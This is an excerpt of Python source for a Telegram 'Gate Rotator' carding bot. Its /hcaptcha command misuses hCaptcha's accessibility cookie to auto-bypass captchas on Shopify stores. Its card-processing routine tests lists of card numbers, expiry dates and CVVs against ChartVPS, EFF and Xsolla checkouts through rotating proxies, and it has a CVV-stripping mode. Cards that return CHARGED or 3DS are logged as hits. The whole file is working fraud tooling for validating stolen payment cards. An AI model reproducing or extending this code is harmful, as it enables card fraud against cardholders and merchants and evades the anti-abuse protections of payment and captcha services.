@bot.message_handler(commands=['hcaptcha'])
async def cmd_hcaptcha(message):
    """Manage hCaptcha accessibility cookie for bypassing Shopify captchas"""
    try:
        user_id = message.from_user.id
        if user_id != OWNER_ID:
            await safe_reply(message, "❌ Owner only.", parse_mode=None)
            return

        text = message.text.strip()
        parts = text.split(maxsplit=1)
        arg = parts[1].strip() if len(parts) > 1 else ""

        if not arg:
            cookie = _load_cookie()
            if cookie:
                status = f"✅ *hCaptcha Cookie Active*\n`{cookie[:30]}...`\n\n"
            else:
                status = "❌ *No hCaptcha cookie set*\n\n"
            status += (
                "*Commands:*\n"
                "`/hcaptcha set <cookie_value>` — Set cookie manually\n"
                "`/hcaptcha request <email>` — Send magic link to email\n"
                "`/hcaptcha link <magic_url>` — Extract cookie from magic link\n"
                "`/hcaptcha test` — Test if cookie works\n"
                "`/hcaptcha clear` — Remove saved cookie\n\n"
                "*How to get cookie:*\n"
                "1. Go to `accounts.hcaptcha.com/accessibility`\n"
                "2. Enter email, get magic link\n"
                "3. Open link in browser\n"
                "4. Copy `hc_accessibility` cookie from DevTools\n"
                "5. `/hcaptcha set <value>`"
            )
            await safe_reply(message, status, parse_mode='Markdown')
            return

        if arg.startswith("set "):
            cookie_val = arg[4:].strip()
            if not cookie_val or len(cookie_val) < 10:
                await safe_reply(message, "❌ Invalid cookie value", parse_mode=None)
                return
            _save_cookie(cookie_val)
            await safe_reply(message, f"✅ *hCaptcha cookie saved!*\n`{cookie_val[:30]}...`\n\nShopify sites with hCaptcha will now auto-solve.", parse_mode='Markdown')

        elif arg.startswith("request "):
            email = arg[8:].strip()
            if '@' not in email:
                await safe_reply(message, "❌ Invalid email", parse_mode=None)
                return
            await safe_reply(message, f"📧 Sending magic link to `{email}`...", parse_mode='Markdown')
            try:
                from hcaptcha_bypass import request_accessibility_link
                loop = asyncio.get_event_loop()
                ok, msg = await loop.run_in_executor(None, request_accessibility_link, email)
                if ok:
                    await safe_reply(message, f"✅ {msg}\n\nCheck your email and use:\n`/hcaptcha link <magic_url>`", parse_mode='Markdown')
                else:
                    await safe_reply(message, f"⚠️ {msg}\n\nTry manually at `accounts.hcaptcha.com/accessibility`", parse_mode='Markdown')
            except Exception as e:
                await safe_reply(message, f"❌ Error: {str(e)}", parse_mode=None)

        elif arg.startswith("link "):
            magic_url = arg[5:].strip()
            if not magic_url.startswith("http"):
                await safe_reply(message, "❌ Invalid URL", parse_mode=None)
                return
            await safe_reply(message, "🔄 Extracting cookie from magic link...", parse_mode='Markdown')
            try:
                from hcaptcha_bypass import extract_cookie_from_link
                loop = asyncio.get_event_loop()
                ok, result = await loop.run_in_executor(None, extract_cookie_from_link, magic_url)
                if ok:
                    await safe_reply(message, f"✅ *Cookie extracted and saved!*\n`{result[:30]}...`\n\nShopify hCaptcha will auto-solve now.", parse_mode='Markdown')
                else:
                    await safe_reply(message, f"⚠️ Auto-extract failed: {result}\n\nOpen the link in browser and copy cookie manually, then:\n`/hcaptcha set <value>`", parse_mode='Markdown')
            except Exception as e:
                await safe_reply(message, f"❌ Error: {str(e)}", parse_mode=None)

        elif arg == "test":
            cookie = _load_cookie()
            if not cookie:
                await safe_reply(message, "❌ No cookie set. Use `/hcaptcha set <value>` first.", parse_mode='Markdown')
                return
            await safe_reply(message, "🧪 Testing hCaptcha solve...", parse_mode='Markdown')
            try:
                token, err = await solve_hcaptcha_with_retry(
                    "a5f74b19-9e45-40e0-b45d-47ff91b7a6c2",
                    "accounts.hcaptcha.com",
                    cookie
                )
                if token:
                    await safe_reply(message, f"✅ *hCaptcha solved!*\nToken: `{token[:40]}...`\n\nCookie is working — Shopify sites will auto-bypass hCaptcha.", parse_mode='Markdown')
                else:
                    await safe_reply(message, f"❌ Solve failed: {err}\n\nCookie may be expired. Get a new one.", parse_mode='Markdown')
            except Exception as e:
                await safe_reply(message, f"❌ Test error: {str(e)}", parse_mode=None)

        elif arg == "clear":
            import os as _os
            cookie_file = os.path.join(os.path.dirname(__file__), "hcaptcha_cookie.json")
            if _os.path.exists(cookie_file):
                _os.remove(cookie_file)
            await safe_reply(message, "🗑️ hCaptcha cookie cleared.", parse_mode='Markdown')

        else:
            await safe_reply(message, "❓ Unknown subcommand. Use `/hcaptcha` for help.", parse_mode='Markdown')

    except Exception as e:
        print(f"[ERROR] /hcaptcha: {e}", flush=True)
        await safe_reply(message, f"❌ Error: {str(e)}", parse_mode=None)


async def process_whmcs_cards(user_id, chat_id, gateway, cards, cancel_event, job_id, skip_cvv=False):
    """Process cards through WHMCS+Stripe checkers"""
    mode_label = " [INTERCEPT NO-CVV]" if skip_cvv else ""
    print(f"[{gateway.upper()}]{mode_label} Starting WHMCS check for user {user_id}, job {job_id}", flush=True)

    if gateway == "chartvps":
        checker = ChartVPSChecker()
        display_name = "ChartVPS"
    elif gateway == "eff":
        checker = EFFChecker()
        display_name = "EFF"
    elif gateway == "xsolla":
        checker = XsollaChecker()
        display_name = "Xsolla"
    else:
        print(f"[ERROR] Unknown WHMCS gateway: {gateway}", flush=True)
        return

    raw_proxies = await get_user_proxies(user_id)
    proxy_list = []
    if raw_proxies:
        for p in raw_proxies:
            try:
                proxy_url = get_proxy_url(p)
                if proxy_url:
                    proxy_list.append(proxy_url)
            except Exception:
                pass
    total = len(cards)
    checked = 0
    hits = 0
    declines = 0
    errors = 0
    start_time = time.time()

    cvv_mode = "🔓 CVV INTERCEPTED (stripped)" if skip_cvv else "🔒 CVV included"
    header_msg = f"""
⚡️ *{display_name} WHMCS+Stripe Checker*
━━━━━━━━━━━━━━━━━━━
📋 Cards: {total}
🌐 Proxies: {len(proxy_list) if proxy_list else 'None'}
{cvv_mode}
━━━━━━━━━━━━━━━━━━━
"""
    try:
        sent = await bot.send_message(chat_id, header_msg, parse_mode='Markdown')
    except Exception:
        sent = None

    for card_line in cards:
        if cancel_event.is_set():
            break

        parts = card_line.strip().split('|')
        if len(parts) != 4:
            errors += 1
            checked += 1
            continue

        cc, mes, ano, cvv = parts
        if len(ano) == 2:
            ano = f"20{ano}"

        proxy = random.choice(proxy_list) if proxy_list else None

        try:
            result_type, result_msg = await checker.check_card(cc, mes, ano, cvv, proxy=proxy, skip_cvv=skip_cvv)
        except Exception as e:
            result_type, result_msg = 'ERROR', str(e)[:60]

        checked += 1
        card_display = f"`{cc}|{mes}|{ano}|{cvv}`"

        try:
            current_cards = await get_user_cards(user_id)
            if card_line in current_cards:
                current_cards.remove(card_line)
                await save_user_cards(user_id, current_cards)
        except:
            pass

        if result_type in ('CHARGED', '3DS'):
            hits += 1
            if result_type == 'CHARGED':
                emoji = "✅"
                label = "CHARGED"
            else:
                emoji = "🔐"
                label = "3DS"

            hit_msg = f"""
{emoji} *{label}*
━━━━━━━━━━━━━━━━━━━
💳 {card_display}
📝 {result_msg}
🏪 Gateway: {display_name}
⏱ Card {checked}/{total}
━━━━━━━━━━━━━━━━━━━
"""
            try:
                await bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
            except Exception:
                pass
            try:
                await append_to_hit_history(user_id, card_line, label, gateway, source_chat_id=chat_id)
            except Exception:
                pass

        elif result_type in ('DECLINED', 'CCN', 'CVV', 'EXPIRED', 'RISK'):
            declines += 1
        else:
            errors += 1

        if checked % 5 == 0 or checked == total:
            elapsed = time.time() - start_time
            speed = checked / elapsed if elapsed > 0 else 0
            progress_msg = f"""
⚡️ *{display_name} Progress*
━━━━━━━━━━━━━━━━━━━
📊 {checked}/{total} checked
✅ Hits: {hits}
❌ Declined: {declines}
⚠️ Errors: {errors}
⏱ Speed: {speed:.1f} cards/sec
━━━━━━━━━━━━━━━━━━━
"""
            try:
                if sent:
                    await bot.edit_message_text(progress_msg, chat_id, sent.message_id, parse_mode='Markdown')
            except Exception:
                pass

        await asyncio.sleep(random.uniform(2, 4))

    elapsed = time.time() - start_time
    final_msg = f"""
🏁 *{display_name} Check Complete*
━━━━━━━━━━━━━━━━━━━
📊 Total: {total}
✅ Hits: {hits}
❌ Declined: {declines}
⚠️ Errors: {errors}
⏱ Time: {elapsed:.0f}s
━━━━━━━━━━━━━━━━━━━
"""
    try:
        await bot.send_message(chat_id, final_msg, parse_mode='Markdown')
    except Exception:
        pass

    print(f"[{gateway.upper()}] Done. {hits} hits / {total} cards", flush=True)


# ==================== MAIN ====================

async def main():
    log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "INFO")
    log("   PayPal & Shopify Gate Rotator Bot v5.0 Starting...", "INFO")
    log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "INFO")
    log(f"Owner ID: {OWNER_ID}", "DEBUG")
    log("Bot Token: ****[MASKED]****", "DEBUG")
    log("User isolation: ENABLED", "INFO")
    log("Proxy support: ENABLED", "INFO")
    log("Approval system: ENABLED", "INFO")
    log("Shopify checker: ENABLED", "INFO")
    log("Concurrency: UNLIMITED (no hard limits)", "INFO")
    
    # Initialize database (PostgreSQL for Railway deployment)
    db_connected = await init_database()
    log(f"Database: {'PostgreSQL connected' if db_connected else 'Using file storage'}", "INFO")
    record_event("db_connected" if db_connected else "db_disconnected", "startup")

    # Load persisted owner-controlled settings (batch sizes, site-cap override)
    try:
        loaded = await load_global_settings()
        if loaded:
            log(f"[SETTINGS] Loaded: batchsh={GLOBAL_BATCH_SIZE}, batchpp={GLOBAL_PP_BATCH_SIZE}, parallelsh_cap={GLOBAL_SHOPIFY_SITE_PARALLEL_CAP}", "INFO")
        else:
            log("[SETTINGS] No persisted settings loaded (defaults in use)", "INFO")
    except Exception as e:
        log(f"[SETTINGS] Load failed (defaults in use): {e}", "WARNING")

    # Best-effort recovery: import existing local hit history files into DB once DB is available.
    if db_connected:
        try:
            await migrate_local_hits_to_db()
        except Exception as e:
            log(f"[DB] Hit migration skipped/failed: {e}", "WARNING")

    # Start monitoring/alert loop (non-blocking)
    try:
        asyncio.create_task(evaluate_alerts_loop())
    except Exception:
        pass

    # Optional scheduled daily export (owner only)
    if os.environ.get("DAILY_EXPORT_ENABLED", "0") == "1":
        try:
            asyncio.create_task(daily_export_loop())
        except Exception as e:
            log(f"Daily export task failed to start: {e}", "WARNING")
    
    # Load local BIN database (374k+ entries for instant lookups)
    load_bin_database_sync()
    log(f"BIN Database: {len(BIN_DATABASE):,} entries loaded", "INFO")
    
    # Auto-approve owner
    await add_approved_user(OWNER_ID)
    
    # Check for resume state and notify users
    resume_data = await load_resume_state()
    if resume_data and resume_data.get("users"):
        log(f"Found {len(resume_data['users'])} users with saved queues - notifying...", "INFO")
        notified = await notify_users_on_restart()
        log(f"Notified {notified} users about restart", "SUCCESS")
    
    log("Bot is now running and waiting for commands...", "SUCCESS")
    log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "INFO")
    
    # Start polling immediately (removed debug tests for faster startup)
    await bot.infinity_polling(skip_pending=True)




if __name__ == '__main__':
    asyncio.run(main())

